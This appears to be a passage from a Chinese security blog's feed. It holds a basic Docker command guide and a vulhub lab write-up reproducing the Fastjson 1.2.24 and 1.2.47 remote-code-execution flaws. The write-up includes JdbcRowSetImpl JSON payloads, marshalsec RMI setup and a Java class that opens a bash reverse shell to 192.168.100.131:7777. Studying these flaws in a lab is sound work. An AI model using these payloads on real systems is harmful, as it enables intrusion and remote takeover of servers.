    <link href="https://w-sqrt7.github.io/2024/04/27/other/basic/Docker%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/"/>
    <id>https://w-sqrt7.github.io/2024/04/27/other/basic/Docker%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/</id>
    <published>2024-04-27T03:00:42.014Z</published>
    <updated>2024-04-27T03:00:52.215Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker使用基础详解"><a href="#Docker使用基础详解" class="headerlink" title="Docker使用基础详解"></a>Docker使用基础详解</h1><h2 id="一、什么是docker"><a href="#一、什么是docker" class="headerlink" title="一、什么是docker"></a>一、什么是docker</h2><p>Docker 是一个开源的应用容器引擎，基于Go 语言并遵从 Apache2.0 协议开源。</p><p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。</p><p>容器是完全使用沙箱机制，相互之间不会有任何接口，更重要的是容器性能开销极低。</p><ul><li>容器和镜像</li></ul><p>通过镜像启动一个容器，一个镜像是一个可执行的包，其中包括运行应用程序所需要的所有内容包含代码，运行时间，库、环境变量、和配置文件。容器是镜像的运行实例，当被运行时有镜像状态和用户进程，可以使用docker ps 查看。</p><ul><li>容器和虚拟机</li></ul><p>容器时在linux上本机运行，并与其他容器共享主机的内核，它运行的一个独立的进程，不占用其他任何可执行文件的内存，非常轻量。</p><p>虚拟机运行的是一个完成的操作系统，通过虚拟机管理程序对主机资源进行虚拟访问，相比之下需要的资源更多。</p><h2 id="二、docker和docker-compose"><a href="#二、docker和docker-compose" class="headerlink" title="二、docker和docker-compose"></a>二、docker和docker-compose</h2><p><a href="https://blog.csdn.net/Prince_WCS/article/details/135180728">原文链接 ψ(｀∇´)ψ 强烈推荐看完</a></p><p>Docker 是一种可以让您把 WordPress 应用和它需要的环境（比如 PHP、MySQL 等）打包成一个个小盒子的技术，这个小盒子就叫做容器。</p><p>Docker Compose 是一种可以让您用一个文件来管理多个容器的工具，是 Docker 的一个子项目，可以帮助用户定义和运行多容器 Docker 应用程序，使用 Docker Compose 可以更轻松地管理多个容器的应用程序。</p><p>比如，您的 WordPress 应用可能需要一个 web 容器和一个 db 容器，分别运行 WordPress 程序和 MySQL 数据库。如果您只用 Docker，您可能需要分别创建和启动这两个容器，然后还要设置它们之间的连接。如果您用 Docker Compose，您只需要在一个文件里写下这两个容器的配置，然后用一个命令就可以一起创建和启动它们，而且它们之间的连接也会自动设置好。这样，您就可以更轻松地管理和运行您的 WordPress 应用。</p><h2 id="三、常用命令"><a href="#三、常用命令" class="headerlink" title="三、常用命令"></a>三、常用命令</h2><h3 id="docker常用命令"><a href="#docker常用命令" class="headerlink" title="docker常用命令"></a>docker常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">**************************************docker命令******************************************</span><br><span class="line"># 启动docker</span><br><span class="line">systemctl start docker</span><br><span class="line"> </span><br><span class="line"># 关闭docker</span><br><span class="line">systemctl stop docker</span><br><span class="line"> </span><br><span class="line"># 重启docker</span><br><span class="line">systemctl restart docker</span><br><span class="line"> </span><br><span class="line"># docker设置随服务启动而自启动</span><br><span class="line">systemctl enable docker</span><br><span class="line"></span><br><span class="line">************************************docker镜像命令*****************************************</span><br><span class="line"># 拉取镜像</span><br><span class="line"># 不加tag(版本号) 即拉取docker仓库中 该镜像的最新版本latest 加:tag 则是拉取指定版本</span><br><span class="line"># https://hub.docker.com/search?type=image （去官网镜像搜索）</span><br><span class="line">docker pull 镜像名 </span><br><span class="line">docker pull 镜像名:tag</span><br><span class="line"></span><br><span class="line"># 查看镜像列表</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"># 搜索镜像</span><br><span class="line">docker search 镜像名</span><br><span class="line">docker search --filter=STARS=9000 mysql 搜索 STARS &gt;9000的 mysql 镜像</span><br><span class="line"></span><br><span class="line"># 删除镜像</span><br><span class="line"># 删除一个</span><br><span class="line">docker rmi -f 镜像名/镜像ID</span><br><span class="line"># 删除多个 其镜像ID或镜像用用空格隔开即可 </span><br><span class="line">docker rmi -f 镜像名/镜像ID 镜像名/镜像ID 镜像名/镜像ID</span><br><span class="line"> </span><br><span class="line"># 删除全部镜像  -a 意思为显示全部, -q 意思为只显示ID</span><br><span class="line">docker rmi -f $(docker images -aq)</span><br><span class="line"></span><br><span class="line">************************************docker容器命令*****************************************</span><br><span class="line"># 查看所有容器列表（包含 正在运行 和 已停止的）</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"># 启动容器</span><br><span class="line">docker start 容器ID/容器名</span><br><span class="line"> </span><br><span class="line"># 停止容器</span><br><span class="line">docker stop 容器ID/容器名</span><br><span class="line"> </span><br><span class="line"># 重启容器</span><br><span class="line">docker restart 容器ID/容器名</span><br><span class="line"></span><br><span class="line"># kill 容器</span><br><span class="line">docker kill 容器ID/容器名</span><br><span class="line"> </span><br><span class="line"># 容器文件拷贝 （无论容器是否开启 都可以进行拷贝）</span><br><span class="line"># docker cp 容器ID/名称:文件路径  要拷贝到外部的路径 | 要拷贝到外部的路径  容器ID/名称:文件路径</span><br><span class="line"># 示例：docker cp nginx:/etc/nginx/conf.d /data/applications/nginx/conf/conf.d</span><br><span class="line"># 从容器内 拷出</span><br><span class="line">docker cp 容器ID/名称: 容器内路径  容器外路径</span><br><span class="line"># 从外部 拷贝文件到容器内</span><br><span class="line">docker  cp 容器外路径 容器ID/名称: 容器内路径</span><br><span class="line"> </span><br><span class="line"># 查看容器日志</span><br><span class="line">docker logs -f --tail=要查看末尾多少行，默认all 容器ID</span><br><span class="line"> </span><br><span class="line"># 更换容器名</span><br><span class="line">docker rename 容器ID/容器名 新容器名</span><br><span class="line"></span><br><span class="line"># 停止运行的容器 </span><br><span class="line">docker stop 容器名/容器ID</span><br><span class="line"> </span><br><span class="line"># 删除一个容器</span><br><span class="line">docker rm -f 容器名/容器ID</span><br><span class="line"> </span><br><span class="line"># 删除多个容器 空格隔开要删除的容器名或容器ID</span><br><span class="line">docker rm -f 容器名/容器ID 容器名/容器ID 容器名/容器ID</span><br><span class="line"> </span><br><span class="line"># 删除全部容器</span><br><span class="line">docker rm -f $(docker ps -aq)</span><br><span class="line"></span><br><span class="line"># 进入容器</span><br><span class="line">docker exec -it 容器名/容器ID /bin/bash</span><br><span class="line"></span><br><span class="line"># 直接退出 （如果没有添加-d 参数(持久化运行容器) 该容器会被关闭 ） </span><br><span class="line">exit</span><br><span class="line"> </span><br><span class="line"># 优雅退出 （无论是否添加-d 参数 容器都不会被关闭）</span><br><span class="line">Ctrl + p + q </span><br><span class="line"></span><br><span class="line"># 查看 Docker 容器、镜像、卷等资源的占用情况</span><br><span class="line">docker system df</span><br><span class="line"></span><br><span class="line"># 清理所有废弃镜像与Build Cache #谨慎使用</span><br><span class="line">docker system prune -a</span><br><span class="line">#清理整个 Docker 系统中的未在使用资源，包括未使用的镜像、容器、网络和数据卷等。</span><br></pre></td></tr></table></figure><h3 id="docker-compose常用命令"><a href="#docker-compose常用命令" class="headerlink" title="docker-compose常用命令"></a>docker-compose常用命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># 查看帮助</span><br><span class="line">docker-compose -h                           </span><br><span class="line"></span><br><span class="line"># 启动所有docker-compose服务</span><br><span class="line">docker-compose up   </span><br><span class="line"></span><br><span class="line"># 启动所有docker-compose服务并后台运行</span><br><span class="line">docker-compose up -d          </span><br><span class="line"></span><br><span class="line">#强制终止正在运行的服务容器</span><br><span class="line">docker-compose kill</span><br><span class="line"></span><br><span class="line"># 停止并删除容器、网络、卷、镜像</span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"># 进入容器实例内部yml文件中写的服务id /bin/bash</span><br><span class="line">docker-compose exec  yml里面的服务id         </span><br><span class="line"></span><br><span class="line"># 展示当前docker-compose编排过的运行的所有容器</span><br><span class="line">docker-compose ps</span><br><span class="line"></span><br><span class="line"># 展示当前docker-compose编排过的容器进程</span><br><span class="line">docker-compose top                     </span><br><span class="line"></span><br><span class="line"># 查看容器输出日志</span><br><span class="line">docker-compose logs  yml里面的服务id     </span><br><span class="line"></span><br><span class="line"># 检查配置</span><br><span class="line">docker-compose config</span><br><span class="line"></span><br><span class="line"># 检查配置，有问题才有输出</span><br><span class="line">docker-compose config -q  </span><br><span class="line"></span><br><span class="line"># 启动服务</span><br><span class="line">docker-compose start</span><br><span class="line"></span><br><span class="line"># 停止服务</span><br><span class="line">docker-compose stop      </span><br><span class="line"></span><br><span class="line"># 重启服务</span><br><span class="line">docker-compose restart   </span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://zhuanlan.zhihu.com/p/89587030">https://zhuanlan.zhihu.com/p/89587030</a></p><p><a href="https://zhuanlan.zhihu.com/p/187505981">https://zhuanlan.zhihu.com/p/187505981</a></p><p><a href="https://zhuanlan.zhihu.com/p/620097083">https://zhuanlan.zhihu.com/p/620097083</a></p><p><a href="https://blog.csdn.net/Prince_WCS/article/details/135180728">https://blog.csdn.net/Prince_WCS/article/details/135180728</a></p><p><a href="https://blog.csdn.net/Pan_peter/article/details/128860771">https://blog.csdn.net/Pan_peter/article/details/128860771</a></p><p><a href="https://blog.csdn.net/qq_38924779/article/details/135035765">https://blog.csdn.net/qq_38924779/article/details/135035765</a></p><p><a href="https://www.freecodecamp.org/chinese/news/how-to-remove-all-docker-images-a-docker-cleanup-guide/">https://www.freecodecamp.org/chinese/news/how-to-remove-all-docker-images-a-docker-cleanup-guide/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Docker使用基础详解&quot;&gt;&lt;a href=&quot;#Docker使用基础详解&quot; class=&quot;headerlink&quot; title=&quot;Docker使用基础详解&quot;&gt;&lt;/a&gt;Docker使用基础详解&lt;/h1&gt;&lt;h2 id=&quot;一、什么是docker&quot;&gt;&lt;a href=&quot;#一、</summary>
      
    
    
    
    <category term="计算机基础知识" scheme="https://w-sqrt7.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="转载" scheme="https://w-sqrt7.github.io/tags/%E8%BD%AC%E8%BD%BD/"/>
    
    <category term="基础" scheme="https://w-sqrt7.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>【vulhub】Fastjson漏洞复现</title>
    <link href="https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>https://w-sqrt7.github.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2024-04-25T11:30:55.983Z</published>
    <updated>2024-04-25T12:34:52.427Z</updated>
    
    <content type="html"><![CDATA[<h1 id="【vulhub】Fastjson漏洞复现"><a href="#【vulhub】Fastjson漏洞复现" class="headerlink" title="【vulhub】Fastjson漏洞复现"></a>【vulhub】Fastjson漏洞复现</h1><h1 id="1-2-24-rce"><a href="#1-2-24-rce" class="headerlink" title="1.2.24-rce"></a>1.2.24-rce</h1><h2 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</p><p>使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</p><p>常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！</p><p>因为目标环境是Java 8u102，没com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。</p><p>影响范围：fastjson&lt;&#x3D;1.2.24</p><h2 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>实验前提：python3版本，java1.8版本</p><p>java环境配置可参考文章：<a href="https://blog.csdn.net/huayimy/article/details/130273362">https://blog.csdn.net/huayimy/article/details/130273362</a></p><p>漏洞验证，利用dnslog等平台进行验证，BP抓包，修改为POST方法，修改Content-Type，放入payload，然后发送数据包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 74</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&quot;zeo&quot;:&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dgs0uq.dnslog.cn&quot;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425203104478.png" alt="image-20240425203104478"></p><p>漏洞利用，首先编译payload，利用<code>javac TouchFile.java</code>命令，编译TouchFile.java文件，生成TouchFile.class文件，实际情况中需要将编译好的payload放在公网服务器上的，这里只是进行本地的验证尝试，理解即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac TouchFile.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"> </span><br><span class="line">public class TouchFile &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;touch&quot;, &quot;/tmp/successFrank&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就将kali作为放置payload的服务器，进入放置payload的目录，进行如下命令，启动服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5555</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174031274.png" alt="image-20240425174031274"></p><p>接下来使用marshalsec项目，启动RMI服务，监听9999端口，并制定加载远程类TouchFile.class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#TouchFile&quot; 9999</span><br></pre></td></tr></table></figure><p><a href="https://github.com/mbechler/marshalsec">marshalsec项目下载地址</a></p><p>项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174713907.png" alt="image-20240425174713907"></p><p>然后访问靶机，BP抓包，进行修改，将GET方法改为POST方法发送，修改Content-Type，加入payload，发送，观察响应报文发现已经成功创建。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 168</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/TouchFile&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-25%20174829.png" alt="屏幕截图 2024-04-25 174829"></p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425175440976.png" alt="image-20240425175440976"></p><p>也可以直接进入docker容器中进行查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker exex –it 你的CONTAINER_ID bash</span><br></pre></td></tr></table></figure><p><strong>上面的过程理解之后</strong>，然后开始尝试getshell，还是先编译payload，注意修改里面的ip和端口，还有一点需要注意，该Java文件的文件名需要和其内容中的public后的公共类相同，具体参考java的命名规范，否则是会出现编译错误的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// javac GetShell.java</span><br><span class="line">import java.lang.Runtime;</span><br><span class="line">import java.lang.Process;</span><br><span class="line"> </span><br><span class="line">public class GetShell &#123;</span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/192.168.100.131/7777 0&gt;&amp;1&quot;&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            // do nothing</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>nc开启监听，等待shell反弹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182200299.png" alt="image-20240425182200299"></p><p>python开启http服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 5555</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182338663.png" alt="image-20240425182338663"></p><p>开启RMI服务，并监听9999端口，注意修改对应内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#GetShell&quot; 9999 </span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182500809.png" alt="image-20240425182500809"></p><p>BP抓包，改为POST请求方法，修改Content-Type，加入payload(注意修改内容)并发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 173</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/GetShell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就发现已经成功进行getshell操作了</p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183720913.png" alt="image-20240425183720913"></p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183748769.png" alt="image-20240425183748769"></p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183934178.png" alt="image-20240425183934178"></p><p><strong>或利用工具进行漏洞验证</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JsonExp -u http://192.168.100.134:8090/ -l tvcy5n.dnslog.cn</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195446761.png" alt="image-20240425195446761"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/TouchFile</span><br><span class="line">JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/GetShell</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195613834.png" alt="image-20240425195613834"></p><h1 id="1-2-47-rce"><a href="#1-2-47-rce" class="headerlink" title="1.2.47-rce"></a>1.2.47-rce</h1><h2 id="漏洞原理：-1"><a href="#漏洞原理：-1" class="headerlink" title="漏洞原理："></a>漏洞原理：</h2><p>Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</p><h2 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h2><p>基本流程手法和上面一个漏洞基本相同，只是最后的BP发送的payload稍稍有点区别</p><p>和上一个一样，先开启各项服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 7777</span><br><span class="line">python -m http.server 5555</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.100.131:5555/#GetShell&quot; 9999</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202024134.png" alt="image-20240425202024134"></p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202135914.png" alt="image-20240425202135914"></p><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202210491.png" alt="image-20240425202210491"></p><p>然后BP抓包，修改POST方法，修改Content-Type，修改payload发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 272</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.100.131:9999/GetShell&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425202527880.png" alt="image-20240425202527880"></p><p><img 